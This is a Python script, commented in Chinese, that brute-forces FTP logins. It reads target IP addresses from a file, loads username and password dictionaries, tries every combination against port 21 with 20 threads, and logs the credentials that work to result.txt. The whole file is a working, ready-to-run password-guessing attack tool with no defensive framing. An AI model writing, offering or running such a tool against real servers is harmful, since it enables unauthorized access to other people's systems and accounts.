# -*- conding:utf-8 -*-
from ftplib import FTP
import time
import threading
import queue

q_ip = queue.Queue()  #ip地址列队
q_user = queue.Queue()  #用户名列队
q_passwd = queue.Queue()  #密码列队

succlog=open('result.txt','a')
host = ''
user = ''

login = []
Error_count = 0

lock = threading.Lock()


def control(user_dict,pass_dict,thread_count):    #控制列队
    global host,user,Error_count
    host = q_ip.get()
    user = q_user.get()
    while True:
        if q_passwd.qsize() == 0:   #判断是否还有密码列队
            time.sleep(3)  # 防止提前更换账号
            if q_user.qsize() == 0:  #判断是否还有账号列队
                if q_ip.qsize() ==0:   #判断是否还有ip列队
                    break
                else:
                    host = q_ip.get()
                    Error_count = 0  #报错次数清零

                    try:
                        with open('dict\%s'%(user_dict),'r') as f:  #添加用户名到列队
                            for user in f.readlines():
                                user = user.strip('\n')
                                q_user.put(user)
                    except:
                        pass
            else:
                user = q_user.get()
                try:
                    with open("dict\%s"%(pass_dict),'r') as f:   #添加密码到列队
                        for password in f.readlines():
                            pas = password.strip('\n')
                            q_passwd.put(pas)
                except:
                    pass

        if Error_count == thread_count + thread_count:  # 错误次数等于线程数x2一样后 清理账号和密码列队 换下个ip
            while not q_user.empty():
                q_user.get()
            while not q_passwd.empty():
                q_passwd.get()
            if not q_ip.empty():
                time.sleep(3)

            else:
                time.sleep(3)

            Error_count = 0


def thread_ftp():   #线程
    global Error_count
    while True:
        if q_passwd.qsize() == 0:   #判断是否还有密码列队
            if q_user.qsize() == 0:  #判断是否还有账号列队
                if q_ip.qsize() == 0:   #判断是否还有ip列队
                    break

        try:
            password = q_passwd.get(block=True,timeout=10)    #密码列队为空时 10秒内没数据 就结束
        except:
            break

        try:
            ftp = FTP()
            ftp.connect(host, 21)
            ftp.login(user,password)
            lock.acquire()  # 加锁

            login.append("[*] ftp成功 host:%s --> user:%s --> pass:%s" % (host, user, password))
            succlog.write("[*] ftp成功 host:%s --> user:%s --> pass:%s\n" % (host, user, password))
            ftp.quit()
            while not q_passwd.empty():   #密码正确后 清理密码列队
                q_passwd.get()
            lock.release()  # 解锁
        except WindowsError as e:
            lock.acquire()  # 加锁
            Error_count +=1
            lock.release()  # 解锁


        except:
            pass


def brute_ftp(ip,user_dict,pass_dict,thread_count):  #ip地址(列表)，账号文件，密码文件，线程数
    thread = []

    for i in ip:   #添加ip到列队
        q_ip.put(i)
    try:
        with open('dict\%s'%(user_dict),'r') as f:  #添加用户名到列队
            for user in f.readlines():
                user = user.strip('\n')
                q_user.put(user)
    except:
        pass
    try:
        with open("dict\%s"%(pass_dict),'r') as f:   #添加密码到列队
            for password in f.readlines():
                pas = password.strip('\n')
                q_passwd.put(pas)
    except:
        pass

    thread_control = threading.Thread(target=control,args=(user_dict,pass_dict,thread_count,))
    thread_control.start()

    for i in range(thread_count):
        f = threading.Thread(target=thread_ftp)
        f.start()
        thread.append(f)
    for i in thread:
        i.join()

    time.sleep(2)  #防止线程打印没完成就打印
    if login == []:
        print('爆破结束，没有爆破成功！')
    else:
        for i in login:
            print("%s\n" %i)


def main():    #填写配置 和 处理ip
    user_dict = input("[*] 用户名文件:")
    pass_dict = input("[*] 密码文件:")
    thread_count =20
    with open('ip.txt','r') as f:
        lines=f.readlines()
        for line in lines:
            line=line.strip()
            brute_ftp(line, user_dict, pass_dict, thread_count)

if __name__=='__main__':
    main()